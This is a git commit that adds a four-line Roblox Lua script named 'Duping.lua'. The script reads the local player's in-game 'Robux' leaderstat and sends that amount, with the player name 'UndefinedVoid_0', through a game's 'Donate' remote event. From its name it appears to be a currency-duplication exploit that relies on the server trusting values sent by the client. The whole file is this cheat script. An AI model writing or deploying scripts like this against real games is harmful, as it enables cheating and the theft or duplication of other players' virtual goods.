caf7ddebe5f208f008431087bf220f55bac2587f
ChaseOSDeveloper <90874854+ChaseOSDeveloper@users.noreply.github.com>
2022-10-15 20:45:29 -0400

    Create Duping.lua

---
+++ Duping.lua
@@ -0,0 +1,4 @@
+local ohString1 = "UndefinedVoid_0"
+local ohNumber2 = game.Players.LocalPlayer.leaderstats.Robux.Value
+
+game:GetService("ReplicatedStorage").Events.Donate:FireServer(ohString1, ohNumber2)
